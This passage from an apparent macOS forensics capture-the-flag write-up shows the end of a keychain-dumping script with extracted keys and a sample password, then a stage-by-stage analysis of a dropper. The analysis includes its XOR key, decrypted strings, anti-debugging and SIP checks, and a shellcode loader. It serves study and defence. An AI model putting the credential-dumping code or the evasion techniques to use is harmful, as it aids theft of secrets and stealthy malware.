</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>: <span style="color:#e6db74">&#39;Public Keys&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;records&#39;</span>: keychain<span style="color:#f92672">.</span>dump_public_keys(),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_console&#39;</span>: args<span style="color:#f92672">.</span>dump_public_keys,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_disk&#39;</span>: args<span style="color:#f92672">.</span>export_public_keys,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_directory&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#39;keys&#39;</span>, <span style="color:#e6db74">&#39;public&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_x509_certificates <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_x509_certificates:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>: <span style="color:#e6db74">&#39;x509 Certificates&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;records&#39;</span>: keychain<span style="color:#f92672">.</span>dump_x509_certificates(),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_console&#39;</span>: args<span style="color:#f92672">.</span>dump_x509_certificates,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_disk&#39;</span>: args<span style="color:#f92672">.</span>export_x509_certificates,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_directory&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#39;certificates&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> record_collection <span style="color:#f92672">in</span> output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;records&#39;</span> <span style="color:#f92672">in</span> record_collection:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                number_records <span style="color:#f92672">=</span> len(record_collection[<span style="color:#e6db74">&#39;records&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                collection_summary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (len(record_collection[<span style="color:#e6db74">&#39;records&#39;</span>]), record_collection[<span style="color:#e6db74">&#39;header&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                logger<span style="color:#f92672">.</span>info(collection_summary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                summary_output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> collection_summary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> record <span style="color:#f92672">in</span> record_collection[<span style="color:#e6db74">&#39;records&#39;</span>]:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> record_collection<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;write_to_console&#39;</span>, <span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> str(record)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                            logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> line)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> record_collection<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;write_to_disk&#39;</span>, <span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        record<span style="color:#f92672">.</span>write_to_disk(record_collection<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;write_directory&#39;</span>, args<span style="color:#f92672">.</span>output))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        summary_output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;Dump End: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> any(x<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;write_to_disk&#39;</span>, <span style="color:#66d9ef">False</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> output):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#34;summary.txt&#34;</span>), <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> summary_fp:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> summary_output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    summary_fp<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> line)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    logger<span style="color:#f92672">.</span>info(line)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> summary_output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                logger<span style="color:#f92672">.</span>info(line)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Some great reading on the Keychain Format can be found here:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://repo.zenk-security.com/Forensic/Keychain%20Analysis%20with%20Mac%20OS%20X%20Memory%20Forensics.pdf</span>
</span></span></code></pre></div><p>so after tweaking and running the <code>chainbreaker.py</code>:</p>
<pre tabindex="0"><code>2025-07-30 19:00:16,305 - INFO - Runtime Command: chainbreaker.py login.keychain -a --password-prompt
2025-07-30 19:00:16,305 - INFO - Keychain: login.keychain
2025-07-30 19:00:16,305 - INFO - Keychain MD5: 870f997577873112451b2674d1791b97
2025-07-30 19:00:16,305 - INFO - Keychain 256: 5f1f5c59f8164ca882842fca173be7d769f76e0bc9944e026234f01d678b9f32
2025-07-30 19:00:16,305 - INFO - Dump Start: 2025-07-30 19:00:16.305391
[+] Master Key: 2c1f42204086006d6739c650bcb64bcd4e8942b4308f4377
[+] DB Key: 4fac89ac4d2c7c59b7e55fc08aa92b43bdd3924c817a446b
</code></pre><pre tabindex="0"><code>
2025-07-30 18:58:41,807 - INFO -   [-] Account: peter.parker@dailybugle.com
2025-07-30 18:58:41,807 - INFO -   [-] Service: Gmail - peter.parker@dailybugle.com
2025-07-30 18:58:41,807 - INFO -   [-] Password: WebSlinger2025!
2025-07-30 18:58:41,807 - INFO -   [-] SSGP Label: ed0de6b1805158208ad272a7ec57f727
2025-07-30 18:58:41,807 - INFO -   [-] Record DBKey: b508c427e0bbbfacf7c41e4109177712388daa47e331e262
</code></pre><p>therefore the answer is :</p>
<pre tabindex="0"><code>2c1f42204086006d6739c650bcb64bcd4e8942b4308f4377_4fac89ac4d2c7c59b7e55fc08aa92b43bdd3924c817a446b_b508c427e0bbbfacf7c41e4109177712388daa47e331e262_ed0de6b1805158208ad272a7ec57f727
</code></pre><p>Q10/15) What is the name of the binary executed by the malicious application, and what is the SHA-256 hash of the binary? Format: <em>binaryname_binaryhash</em></p>
<p>In Question 3, we sniffed out <code>ImageEnhancePro.app</code> as the culprit behind the system’s infection, found in the Downloads folder via Volatility’s <code>mac_list_files</code>. Digging into its <code>main.scpt</code> with applescript-disassembler, we saw it pulls a shady move: it grabs a file named preview from <code>ImageEnhancePro.app/Contents/Resources/</code>  and executes it via <code>syso-exec</code>, storing it as <code>venomPath</code> (suspicious much?). This makes preview the binary executed by the malicious app.
and the SHA-256 hash of this binary is <code>45b098a1208cf63c8ad0beab32ab6d2f9ff2dbf05b6d88382acde55170fcf559</code>
therefore, the answer for this question is :</p>
<pre tabindex="0"><code>preview_45b098a1208cf63c8ad0beab32ab6d2f9ff2dbf05b6d88382acde55170fcf559
</code></pre><p>Q11/15) What is the IP address and port number to which the attacker established a connection from the compromised system? Format: <em>ipaddress:port</em>
Since we already know that the  malicious binary is a  Mach-O executable named <code>preview</code>. Let&rsquo;s start by checking what we&rsquo;re dealing with:</p>
<p>Since we already know that the malicious binary is a Mach-O executable named <code>preview</code>, let&rsquo;s start by checking what we&rsquo;re dealing with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file preview
</span></span><span style="display:flex;"><span>preview: Mach-O 64-bit executable x86_64
</span></span></code></pre></div><h4 id="entry-point-analysis-main--0x100001d80">Entry Point Analysis (<code>main</code> @ 0x100001D80)</h4>
<p>Loading the binary in IDA Pro and analyzing the main function reveals the following execution flow:</p>
<h4 id="stage-0-initialization">Stage 0: Initialization</h4>
<ul>
<li><strong>Command line arguments stored</strong> to static variables</li>
<li><strong>Swift runtime initialization</strong> via <code>swift_once()</code></li>
<li><strong>Large embedded payload loaded</strong> (34,536 bytes) starting with magic bytes <code>1f 8b</code> (gzip header)
<ul>
<li>Stored at address <code>0x1000099E0</code></li>
<li>Contains filename: <code>reverse_shell_encrypted</code></li>
</ul>
</li>
<li><strong>Request variable set to 31</strong> (PT_DENY_ATTACH for ptrace)</li>
<li><strong>Main routine called</strong> at <code>0x1000059D0</code></li>
</ul>
<h4 id="stage-1-anti-debugging-check-sub_100005420--0x100005420">Stage 1: Anti-Debugging Check (<code>sub_100005420</code> @ 0x100005420)</h4>
<p>The binary first performs an anti-debugging check:</p>
<p><strong>Key Points:</strong></p>
<ul>
<li>Calls <code>ptrace(PT_DENY_ATTACH, 0, 0, 0)</code> where PT_DENY_ATTACH = 31</li>
<li><strong>Returns false if debugger detected</strong> → exits with code 1</li>
<li>This prevents dynamic analysis with debuggers like lldb/gdb</li>
<li>Must be bypassed or patched for analysis</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">anti_debug_check</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ptrace</span>(<span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;  <span style="color:#75715e">// PT_DENY_ATTACH
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><h4 id="stage-2-system-integrity-protection-check-sub_100005470--0x100005470">Stage 2: System Integrity Protection Check (<code>sub_100005470</code> @ 0x100005470)</h4>
<p>The binary checks if macOS System Integrity Protection (SIP) is enabled:</p>
<p><strong>Execution Flow:</strong></p>
<ol>
<li>
<p><strong>Creates NSTask process</strong></p>
</li>
<li>
<p><strong>Decrypts command path:</strong></p>
<ul>
<li>Encrypted: <code>481d4347183d02001e041b45121c5959</code></li>
<li>XOR key: <code>gh057_kn1gh7</code></li>
<li><strong>Decrypted: <code>/usr/bin/csrutil</code></strong></li>
</ul>
</li>
<li>
<p><strong>Decrypts argument:</strong></p>
<ul>
<li>Encrypted: <code>141c5141422c</code></li>
<li><strong>Decrypted: <code>status</code></strong></li>
</ul>
</li>
<li>
<p><strong>Executes:</strong> <code>/usr/bin/csrutil status</code></p>
</li>
<li>
<p><strong>Captures output</strong> via pipe/NSPipe</p>
</li>
<li>
<p><strong>Checks for string:</strong></p>
<ul>
<li>Encrypted: <code>020651575b3a0f</code></li>
<li><strong>Decrypted: <code>enabled</code></strong></li>
</ul>
</li>
<li>
<p><strong>Returns true if SIP is enabled</strong> → binary exits</p>
</li>
<li>
<p><strong>Returns false if SIP is disabled</strong> → continues execution</p>
</li>
</ol>
<p><strong>Purpose:</strong> Malware checks if security features are active before proceeding</p>
<h4 id="stage-3-hardware-uuid-extraction-sub_100002930--0x100002930">Stage 3: Hardware UUID Extraction (<code>sub_100002930</code> @ 0x100002930)</h4>
<p>The binary fingerprints the system to create a unique decryption key:</p>
<p><strong>Execution Flow:</strong></p>
<ol>
<li>
<p><strong>Creates NSTask process</strong></p>
</li>
<li>
<p><strong>Decrypts system profiler path:</strong></p>
<ul>
<li>Encrypted: <code>481d4347182c09075f481b4e141c5558682f1901570e045215</code></li>
<li><strong>Decrypted: <code>/usr/sbin/system_profiler</code></strong></li>
</ul>
</li>
<li>
<p><strong>Decrypts hardware parameter:</strong></p>
<ul>
<li>Encrypted: <code>34387854453b1c0f43022c561309644c473a</code></li>
<li><strong>Decrypted: <code>SPHardwareDataType</code></strong></li>
</ul>
</li>
<li>
<p><strong>Executes:</strong> <code>/usr/sbin/system_profiler SPHardwareDataType</code></p>
</li>
<li>
<p><strong>Parses output</strong> looking for:</p>
<ul>
<li>Encrypted search string: <code>2f094251403e190b11323d7e23</code></li>
<li><strong>Decrypted: <code>Hardware UUID</code></strong></li>
</ul>
</li>
<li>
<p><strong>Extracts UUID value</strong> from line containing &ldquo;Hardware UUID:&rdquo;</p>
<ul>
<li>Splits by &ldquo;: &quot; delimiter</li>
<li>Takes second element</li>
<li>Trims whitespace</li>
</ul>
</li>
<li>
<p><strong>Returns Hardware UUID</strong> (e.g., <code>XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX</code>)</p>
</li>
</ol>
<p><strong>Purpose:</strong> Creates machine-specific decryption key for anti-analysis</p>
<h4 id="stage-4-gzip-decompression-sub_1000030e0--0x1000030e0">Stage 4: Gzip Decompression (<code>sub_1000030E0</code> @ 0x1000030E0)</h4>
<p>The embedded 34KB payload is decompressed:</p>
<p><strong>Key Points:</strong></p>
<ul>
<li>Takes the gzip payload from global storage</li>
<li><strong>Decompresses using gunzip algorithm</strong></li>
<li>Payload contains encrypted reverse shell script</li>
<li>Likely writes to temporary location: <code>/tmp/decompressed_payload</code></li>
</ul>
<h4 id="stage-5-sha-256-hash-derivation-sub_1000042b0--0x1000042b0">Stage 5: SHA-256 Hash Derivation (<code>sub_1000042B0</code> @ 0x1000042B0)</h4>
<p>Creates encryption key from Hardware UUID:</p>
<p><strong>Execution Flow:</strong></p>
<ol>
<li>
<p><strong>Takes Hardware UUID</strong> from Stage 3</p>
</li>
<li>
<p><strong>Executes hashing tool:</strong></p>
<ul>
<li>Encrypted path: <code>481d4347183d02001e140056141d5d</code></li>
<li><strong>Decrypted: <code>/usr/bin/shasum</code></strong></li>
</ul>
</li>
<li>
<p><strong>With parameter:</strong></p>
<ul>
<li>Encrypted: <code>555d06</code></li>
<li><strong>Decrypted: <code>256</code></strong></li>
</ul>
</li>
<li>
<p><strong>Command:</strong> <code>/usr/bin/shasum -a 256 &lt;&lt;&lt; &quot;Hardware-UUID&quot;</code></p>
</li>
<li>
<p><strong>Returns SHA-256 hash</strong> of the Hardware UUID</p>
</li>
</ol>
<p><strong>Purpose:</strong> Derives unique decryption key per machine</p>
<h4 id="stage-6-payload-decryption-sub_100004b40--0x100004b40">Stage 6: Payload Decryption (<code>sub_100004B40</code> @ 0x100004B40)</h4>
<p>The decompressed payload is decrypted:</p>
<p><strong>Key Points:</strong></p>
<ul>
<li>Uses SHA-256 hash as encryption key</li>
<li>Applies additional transformations</li>
<li><strong>OpenSSL operations involved:</strong>
<ul>
<li>Encrypted path: <code>481d4347183d02001e081852091b4359</code></li>
<li><strong>Decrypted: <code>/usr/bin/openssl</code></strong></li>
<li>Operation: <code>dgst</code></li>
<li>Algorithm: <code>-md5</code></li>
</ul>
</li>
</ul>
<h4 id="stage-7-additional-encryption-layer-sub_100004320--0x100004320">Stage 7: Additional Encryption Layer (<code>sub_100004320</code> @ 0x100004320)</h4>
<p>Applies final encryption transformation:</p>
<p><strong>Key Points:</strong></p>
<ul>
<li>Takes decrypted payload</li>
<li>Applies MD5-based operations</li>
<li>Outputs final executable payload</li>
<li>Validates integrity</li>
</ul>
<h4 id="stage-8-payload-writing--execution">Stage 8: Payload Writing &amp; Execution</h4>
<p>The malicious payload is written and executed:</p>
<p><strong>File Writing:</strong></p>
<ol>
<li>
<p><strong>Output path decrypted:</strong></p>
<ul>
<li>Encrypted: <code>481c5d45183c04031f0618470b0d1e40473b0a1a54141e54</code></li>
<li><strong>Decrypted: <code>/tmp/com.apple.updatesvc</code></strong></li>
<li>Masquerades as legitimate Apple service</li>
</ul>
</li>
<li>
<p><strong>Writes decrypted payload</strong> to <code>/tmp/com.apple.updatesvc</code></p>
</li>
</ol>
<p><strong>Make Executable:</strong></p>
<ol>
<li>
<p><strong>Command path decrypted:</strong></p>
<ul>
<li>Encrypted: <code>480a595b183c03035e03</code></li>
<li><strong>Decrypted: <code>/bin/chmod</code></strong></li>
</ul>
</li>
<li>
<p><strong>Permission flag decrypted:</strong></p>
<ul>
<li>Encrypted: <code>4c10</code></li>
<li><strong>Decrypted: <code>+x</code></strong></li>
</ul>
</li>
<li>
<p><strong>Executes:</strong> <code>/bin/chmod +x /tmp/com.apple.updatesvc</code></p>
</li>
</ol>
<p><strong>Launch Payload:</strong></p>
<ol>
<li><strong>First execution</strong> - Launches <code>/tmp/com.apple.updatesvc</code></li>
<li><strong>Waits for completion</strong></li>
<li><strong>Second execution</strong> - Launches again (persistence mechanism)</li>
<li><strong>Binary exits with code 0</strong></li>
</ol>
<h5 id="xor-decryption-algorithm">XOR Decryption Algorithm</h5>
<p>All encrypted strings use simple XOR with hardcoded key:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_decrypt</span>(hex_string, key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gh057_kn1gh7&#34;</span>):
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex_string)
</span></span><span style="display:flex;"><span>    key_bytes <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data)):
</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(data[i] <span style="color:#f92672">^</span> key_bytes[i <span style="color:#f92672">%</span> len(key_bytes)])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes(result)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span></code></pre></div><h5 id="summary-of-encrypted-strings">Summary of Encrypted Strings</h5>
<table>
  <thead>
      <tr>
          <th>Purpose</th>
          <th>Encrypted Hex</th>
          <th>Decrypted Value</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>System Profiler</td>
          <td><code>481d4347182c09075f481b4e141c5558682f1901570e045215</code></td>
          <td><code>/usr/sbin/system_profiler</code></td>
      </tr>
      <tr>
          <td>Hardware Type</td>
          <td><code>34387854453b1c0f43022c561309644c473a</code></td>
          <td><code>SPHardwareDataType</code></td>
      </tr>
      <tr>
          <td>UUID Identifier</td>
          <td><code>2f094251403e190b11323d7e23</code></td>
          <td><code>Hardware UUID</code></td>
      </tr>
      <tr>
          <td>Hash Tool</td>
          <td><code>481d4347183d02001e140056141d5d</code></td>
          <td><code>/usr/bin/shasum</code></td>
      </tr>
      <tr>
          <td>Hash Algorithm</td>
          <td><code>555d06</code></td>
          <td><code>256</code></td>
      </tr>
      <tr>
          <td>Crypto Tool</td>
          <td><code>481d4347183d02001e081852091b4359</code></td>
          <td><code>/usr/bin/openssl</code></td>
      </tr>
      <tr>
          <td>Crypto Op</td>
          <td><code>030f4341</code></td>
          <td><code>dgst</code></td>
      </tr>
      <tr>
          <td>Hash Type</td>
          <td><code>4a055400</code></td>
          <td><code>-md5</code></td>
      </tr>
      <tr>
          <td>Output File</td>
          <td><code>481c5d45183c04031f0618470b0d1e40473b0a1a54141e54</code></td>
          <td><code>/tmp/com.apple.updatesvc</code></td>
      </tr>
      <tr>
          <td>Decompressed Path</td>
          <td><code>481c5d45183b0e0d5e0a1845021b435053001b0f480b075603</code></td>
          <td><code>/tmp/decompressed_payload</code></td>
      </tr>
      <tr>
          <td>Decompressor</td>
          <td><code>481d4347183d02001e001d591d0140</code></td>
          <td><code>/usr/bin/gunzip</code></td>
      </tr>
      <tr>
          <td>SIP Check Tool</td>
          <td><code>481d4347183d02001e041b45121c5959</code></td>
          <td><code>/usr/bin/csrutil</code></td>
      </tr>
      <tr>
          <td>SIP Status</td>
          <td><code>141c5141422c</code></td>
          <td><code>status</code></td>
      </tr>
      <tr>
          <td>SIP Enabled</td>
          <td><code>020651575b3a0f</code></td>
          <td><code>enabled</code></td>
      </tr>
      <tr>
          <td>Permission Tool</td>
          <td><code>480a595b183c03035e03</code></td>
          <td><code>/bin/chmod</code></td>
      </tr>
      <tr>
          <td>Permission Flag</td>
          <td><code>4c10</code></td>
          <td><code>+x</code></td>
      </tr>
  </tbody>
</table>
<h4 id="attack-chain-summary">Attack Chain Summary:</h4>
<p><img src="images/malware_flowchart.png" alt="attack-chain-flowchart"></p>
<ul>
<li><strong>XOR Key:</strong> <code>gh057_kn1gh7</code> (for string obfuscation)</li>
<li><strong>Payload Decryption Key:</strong> SHA-256 hash of <code>Hardware-UUID</code> &amp; <strong>IV:</strong> MD5 hash of <code>Hardware-UUID</code></li>
<li><strong>Compression:</strong> <code>gzip</code> (magic bytes: <code>1f 8b</code>)</li>
<li><strong>Decompressed Path:</strong> <code>/tmp/decompressed_payload</code></li>
<li><strong>Final Path:</strong> <code>/tmp/com.apple.updatesvc</code></li>
<li><strong>Hash:</strong> Extract gzip from <code>0x1000099E0</code>, decompress, calculate SHA-256</li>
</ul>
<h4 id="tools--techniques-used">Tools &amp; Techniques Used</h4>
<p><strong>Static Analysis:</strong></p>
<ul>
<li>IDA Pro for disassembly/decompilation</li>
<li>XOR decryption script for string deobfuscation</li>
<li>Hex editor for payload extraction</li>
</ul>
<p><strong>Dynamic Analysis Prevention:</strong></p>
<ul>
<li>PT_DENY_ATTACH blocks debuggers</li>
<li>SIP check prevents execution in secure environments</li>
<li>Hardware UUID binding prevents analysis on different machines</li>
</ul>
<p><strong>Evasion Techniques:</strong></p>
<ul>
<li>Multi-layer encryption (XOR + Hardware-UUID-based)</li>
<li>Gzip compression</li>
<li>String obfuscation</li>
<li>Legitimate tool abuse (system_profiler, shasum, openssl)</li>
<li>Service masquerading (com.apple.updatesvc)</li>
</ul>
<h4 id="payload-analysis---comappleupdatesvc">Payload Analysis - com.apple.updatesvc</h4>
<p>Now analyzing the decrypted payload that was written to <code>/tmp/com.apple.updatesvc</code>. Loading it into IDA Pro reveals a much simpler structure compared to the dropper.</p>
<h4 id="payload-metadata">Payload Metadata</h4>
<pre tabindex="0"><code>File: com.apple.updatesvc
Type: Mach-O 64-bit executable x86_64
Size: 17,204 bytes (0x4334)
MD5: b79b2cb56b00cfdb7e046858afc51449
SHA-256: 98e656aa1d6dbb2781eb41c28897c4b3d52afdb80c2e7ab0861196004f15a562
Base Address: 0x100000000
Code Size: 0x30d8
</code></pre><p>The payload has a clean Mach-O structure:</p>
<p><strong>Segments:</strong></p>
<ul>
<li><code>__TEXT</code> - Executable code and read-only data</li>
<li><code>__DATA</code> - Writable data and global variables</li>
<li><code>__LINKEDIT</code> - Dynamic linker information</li>
</ul>
<p><strong>Entry Points:</strong></p>
<ul>
<li><code>start</code> @ 0x100000C70 (calls <code>_main</code>)</li>
<li><code>_main</code> @ 0x100000CB0 (primary execution)</li>
<li></li>
</ul>
<p><strong>Key Observations:</strong></p>
<ul>
<li>Much smaller than the dropper (17KB vs previous binary)</li>
<li>Minimal imports - only basic libc functions</li>
<li>Single main function with straightforward logic</li>
<li>Contains embedded shellcode</li>
</ul>
<h5 id="entry-point-analysis-main--0x100000cb0">Entry Point Analysis (<code>main</code> @ 0x100000CB0)</h5>
<p>The payload&rsquo;s main function is surprisingly simple - it&rsquo;s a <strong>shellcode loader</strong>:</p>
<h6 id="execution-flow">Execution Flow:</h6>
<p><strong>1. Stack Buffer Allocation</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BYTE __dst[<span style="color:#ae81ff">8201</span>];  <span style="color:#75715e">// Large stack buffer for shellcode
</span></span></span></code></pre></div><ul>
<li>Allocates <strong>8,201 bytes</strong> on the stack</li>
<li>Used to store the shellcode before execution</li>
</ul>
<p><strong>2. Shellcode Copy to Stack</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(__dst, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xB8a</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(__dst));
</span></span></code></pre></div><ul>
<li>Copies <strong>8,201 bytes of embedded shellcode</strong> to stack buffer</li>
<li>Shellcode starts with bytes: <code>B8 61</code> (in hex)</li>
<li><code>B8</code> = <code>MOV EAX, imm32</code> (x86 instruction)</li>
<li>This is the beginning of position-independent shellcode</li>
</ul>
<p><strong>3. Memory Allocation with Execute Permission</strong></p>
